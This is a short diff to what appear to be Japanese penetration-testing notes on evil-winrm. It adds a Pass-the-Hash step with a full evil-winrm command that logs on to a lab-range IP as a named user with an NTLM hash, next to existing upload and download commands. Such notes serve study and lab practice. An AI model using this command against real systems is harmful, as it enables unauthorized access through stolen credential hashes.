@@ -16,3 +16,8 @@ download ./hoge.txt
 ```
 upload <path to upload file in attackermachine>
 ```
+
+4. Pass the Hashでターゲットにログオンする。ハッシュはNTLMで取得できる。
+```
+evil-winrm -i 10.10.127.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+```
